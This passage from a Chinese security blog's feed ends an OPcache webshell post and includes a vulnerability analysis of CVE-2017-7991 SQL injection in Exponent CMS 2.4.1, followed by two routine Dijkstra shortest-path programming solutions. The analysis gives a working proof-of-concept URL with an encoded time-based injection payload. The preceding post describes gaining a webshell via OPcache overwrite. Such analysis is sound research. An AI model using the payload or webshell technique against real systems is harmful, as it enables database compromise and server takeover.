<p>上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/afterupload.jpg?raw=true" alt=""></p>
<h2 id="菜刀连上"><a href="#菜刀连上" class="headerlink" title="菜刀连上"></a>菜刀连上</h2><p>此时再去访问 <code>index.php</code>,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/webshell.jpg?raw=true" alt=""></p>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题</p>
<h2 id="ASIS-CTF-2016-–-BinaryCloud"><a href="#ASIS-CTF-2016-–-BinaryCloud" class="headerlink" title="ASIS CTF 2016 – BinaryCloud"></a>ASIS CTF 2016 – BinaryCloud</h2><p>这题是通过上传来覆盖，但后端有各种过滤。<br>附上<a href="https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/" target="_blank" rel="external">writeup</a></p>
<h2 id="ALICTF-2016-homework"><a href="#ALICTF-2016-homework" class="headerlink" title="ALICTF 2016  - homework"></a>ALICTF 2016  - homework</h2><p>这题利用sql注入的dumpfile来实现对缓存文件的覆盖。<br>附上<a href="https://github.com/tothi/ctfs/tree/master/alictf-2016/homework" target="_blank" rel="external">writeup</a></p>
<p><em>（Author:chybeta）</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。&lt;br&gt;本文是对 &lt;a href=&quot;http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/&quot;&gt;《binary-webshell-through-opcache-in-php-7》&lt;/a&gt;一文的测试。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="OPcache" scheme="http://yoursite.com/tags/OPcache/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析</title>
    <link href="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/</id>
    <published>2017-05-11T23:42:07.000Z</published>
    <updated>2017-05-12T02:04:44.432Z</updated>
    
    <content type="html"><![CDATA[<p>Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入<br><a id="more"></a></p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">api</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])) &#123;</div><div class="line">		$_REQUEST[<span class="string">'apikey'</span>] = <span class="keyword">true</span>;  <span class="comment">// set this to force an ajax reply</span></div><div class="line">		$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'You need an API key in order to access Exponent as a Service'</span>, <span class="keyword">null</span>);</div><div class="line">		$ar-&gt;send();  <span class="comment">//FIXME this doesn't seem to work correctly in this scenario</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$key = expUnserialize(base64_decode(urldecode(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])));</div><div class="line">		$cfg = <span class="keyword">new</span> expConfig($key);</div><div class="line">		<span class="keyword">$this</span>-&gt;config = $cfg-&gt;config;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($cfg-&gt;id)) &#123;</div><div class="line">			$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'Incorrect API key or Exponent as a Service module configuration missing'</span>, <span class="keyword">null</span>);</div><div class="line">			$ar-&gt;send();</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'get'</span>])) &#123;</div><div class="line">				<span class="keyword">$this</span>-&gt;handleRequest();</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">200</span>, <span class="string">'ok'</span>, <span class="string">'Your API key is working, no data requested'</span>, <span class="keyword">null</span>);</div><div class="line">				$ar-&gt;send();</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>api()中，先检测参数<code>apikey</code>　是否为空，若不为空，则进入else分支。在分支中，先对参数<code>apikey</code>进行一次<code>urldecode</code>,接着进行 <code>base64_decode</code>,最后进行一次反序列化<code>expUnserialize</code>，在<code>expUnserialize</code>中存在一次小小的过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expUnserialize</span><span class="params">($serial_str)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> ($serial_str === <span class="string">'Array'</span>) <span class="keyword">return</span> <span class="keyword">null</span>;  <span class="comment">// empty array string??</span></div><div class="line">    <span class="keyword">if</span> (is_array($serial_str) || is_object($serial_str)) <span class="keyword">return</span> $serial_str;  <span class="comment">// already unserialized</span></div><div class="line"><span class="comment">//    $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str );</span></div><div class="line">    $out = preg_replace_callback(</div><div class="line">        <span class="string">'!s:(\d+):"(.*?)";!s'</span>,</div><div class="line">        create_function (<span class="string">'$m'</span>,</div><div class="line">            <span class="string">'$m_new = str_replace(\'"\',\'\"\',$m[2]);</span></div><div class="line">            return "s:".strlen($m_new).\':"\'.$m_new.\'";\';'</div><div class="line">        ),</div><div class="line">        $serial_str );</div><div class="line"><span class="comment">//    if ($out1 !== $out) &#123;</span></div><div class="line"><span class="comment">//        eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);</span></div><div class="line"><span class="comment">//    &#125;</span></div></pre></td></tr></table></figure></p>
<p>它会把 经过<code>base64_decode</code>后的<code>$apikey</code> 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行<code>expUnserialize</code>之后，赋值给<code>$key</code>，并在之后实例化一个 <code>expConfig</code>对象。<code>expConfig</code>部分代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">expConfig</span> <span class="keyword">extends</span> <span class="title">expRecord</span> </span>&#123;</div><div class="line">	<span class="keyword">protected</span> $table = <span class="string">'expConfigs'</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params=null)</span> </span>&#123;</div><div class="line">		<span class="keyword">global</span> $db;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!is_array($params)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;location_data = serialize($params);</div><div class="line">            <span class="keyword">parent</span>::__construct($db-&gt;selectValue(<span class="keyword">$this</span>-&gt;table, <span class="string">'id'</span>, <span class="string">"location_data='"</span>.<span class="keyword">$this</span>-&gt;location_data.<span class="string">"'"</span>));</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">parent</span>::__construct($params);</div><div class="line">        &#125;</div><div class="line">	....</div></pre></td></tr></table></figure>
<p>在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于<code>selectValue</code>的定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectValue</span><span class="params">($table, $col, $where=null)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> ($where == <span class="keyword">null</span>)</div><div class="line">		$where = <span class="string">"1"</span>;</div><div class="line">	$sql = <span class="string">"SELECT "</span> . $col . <span class="string">" FROM `"</span> . <span class="keyword">$this</span>-&gt;prefix . <span class="string">"$table` WHERE $where LIMIT 0,1"</span>;</div><div class="line">	$res = @mysqli_query(<span class="keyword">$this</span>-&gt;connection, $sql);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ($res == <span class="keyword">null</span>)</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	$obj = mysqli_fetch_object($res);</div><div class="line">	<span class="keyword">if</span> (is_object($obj)) &#123;</div><div class="line">		<span class="keyword">return</span> $obj-&gt;$col;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到，在检查完<code>$params</code>是否是数组后，将我们传入的<code>$params</code>序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 <code>location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39;</code> 中的单引号进行闭合。</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/exponent241/index.php</div><div class="line">?module=eaas</div><div class="line">&amp;action=api</div><div class="line">&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7</div></pre></td></tr></table></figure>
<p>其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)#</p>
<p>查看 mysql.log ，可以发现成功注入。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true" alt=""><br>运行的 sql语句 为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1</div></pre></td></tr></table></figure>
<p>可以看到单引号被成功闭合。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ACMPKU-OJ:2387</title>
    <link href="http://yoursite.com/2017/05/04/ACMPKU-OJ-2387/"/>
    <id>http://yoursite.com/2017/05/04/ACMPKU-OJ-2387/</id>
    <published>2017-05-04T03:12:17.000Z</published>
    <updated>2017-05-04T03:22:13.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Bessie is out in the field and wants to get back to the barn to get as much sleep as possible before Farmer John wakes her for the morning milking. Bessie needs her beauty sleep, so she wants to get back as quickly as possible.<br><a id="more"></a><br>Farmer John’s field has N (2 &lt;= N &lt;= 1000) landmarks in it, uniquely numbered 1..N. Landmark 1 is the barn; the apple tree grove in which Bessie stands all day is landmark N. Cows travel in the field using T (1 &lt;= T &lt;= 2000) bidirectional cow-trails of various lengths between the landmarks. Bessie is not confident of her navigation ability, so she always stays on a trail from its start to its end once she starts it.</p>
<p>Given the trails between the landmarks, determine the minimum distance Bessie must walk to get back to the barn. It is guaranteed that some such route exists.</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><ul>
<li><p>Line 1: Two integers: T and N</p>
</li>
<li><p>Lines 2..T+1: Each line describes a trail as three space-separated integers. The first two integers are the landmarks between which the trail travels. The third integer is the length of the trail, range 1..100.</p>
</li>
</ul>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><ul>
<li>Line 1: A single integer, the minimum distance that Bessie must travel to get from landmark N to landmark 1.</li>
</ul>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5 5<br>1 2 20<br>2 3 30<br>3 4 20<br>4 5 20<br>1 5 100</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>90</p>
<h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><p>INPUT DETAILS:</p>
<p>There are five landmarks.</p>
<p>OUTPUT DETAILS:</p>
<p>Bessie can get home by following trails 4, 3, 2, and 1.</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>最短路径 +　队列优先　。<br>这题竟然是先读入边数再读入顶点数，Ｏrz<br>另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。</p>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_V 200000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123; <span class="keyword">int</span> to, cost, flag ;&#125;;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</div><div class="line"></div><div class="line"><span class="keyword">int</span> V;</div><div class="line"><span class="keyword">int</span> E;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX_V];</div><div class="line"><span class="keyword">int</span> d[MAX_V];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;E,&amp;V);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)&#123;</div><div class="line">        <span class="keyword">int</span> s, t, cost;</div><div class="line">        edge temp1,temp2;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;s, &amp;t, &amp;cost);</div><div class="line">        temp1.to = t;</div><div class="line">        temp1.cost = cost;</div><div class="line">        G[s].push_back(temp1);</div><div class="line"></div><div class="line"></div><div class="line">        temp2.to = s;</div><div class="line">        temp2.cost = cost;</div><div class="line">        G[t].push_back(temp2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[V]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; que;</div><div class="line"></div><div class="line">    fill(d+<span class="number">1</span>,d + V+<span class="number">1</span>, INF);</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line">    que.push(P(<span class="number">0</span>,s));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( !que.empty())&#123;</div><div class="line">        P p = que.top();</div><div class="line">        que.pop();</div><div class="line">        <span class="keyword">int</span> v = p.second;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d[v] &lt; p.first)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; G[v].size(); i++)&#123;</div><div class="line">            edge e = G[v][i];</div><div class="line">            <span class="keyword">if</span> ( d[e.to] &gt; d[v] + e.cost) &#123;</div><div class="line">                d[e.to] = d[v] + e.cost;</div><div class="line">                que.push(P(d[e.to], e.to));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;Bessie is out in the field and wants to get back to the barn to get as much sleep as possible before Farmer John wakes her for the morning milking. Bessie needs her beauty sleep, so she wants to get back as quickly as possible.&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
      <category term="最短路径" scheme="http://yoursite.com/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
  </entry>
  
  <entry>
    <title>ACMXMU-OJ:1078</title>
    <link href="http://yoursite.com/2017/05/04/ACMXMU-OJ-1078/"/>
    <id>http://yoursite.com/2017/05/04/ACMXMU-OJ-1078/</id>
    <published>2017-05-03T22:56:31.000Z</published>
    <updated>2017-05-04T00:44:17.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>　　人肉搜索之所以强大，其原因在于世界上任何两个人，要么他们是朋友，要么他们是朋友的朋友，要么他们是朋友的朋友的朋友，要么他们是朋友的朋友的朋友的朋友，要么他们是朋友的朋友的朋友的朋友的朋友。。。人肉搜索引擎正是利用了这一点，对于每个问题，人肉搜索开始M层的搜索，第一层是搜索我的朋友，第二层是搜索我朋友的朋友，第三层是使搜索我朋友的朋友的朋友。。。给一个人际关系表，问M至少要为多少才能保证所有人之间可以通过人肉搜索引擎搜索到。<br><a id="more"></a></p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>　　输入的第一行包含一个正整数N(2 &lt;= N &lt;= 100)，表示总的人数。<br>　　输入的第二行到第N+1行每行有N个整数，第i行第j列的数字Fij如果为1表示第i个人和第j个人是朋友，否则不是。保证Fij = Fji，Fii = 1。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>　　输出这N个人中，保证人肉搜索引擎的正常工作（即所有人都能被搜索到）前提下，M的最小值。如果存在两个人他们不是朋友的朋友的朋友的。。。的朋友，则输出-1。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4<br>1 0 1 1<br>0 1 0 1<br>1 0 1 0<br>1 1 0 1</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>2</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。</p>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><h2 id="dijkstra算法"><a href="#dijkstra算法" class="headerlink" title="dijkstra算法"></a>dijkstra算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
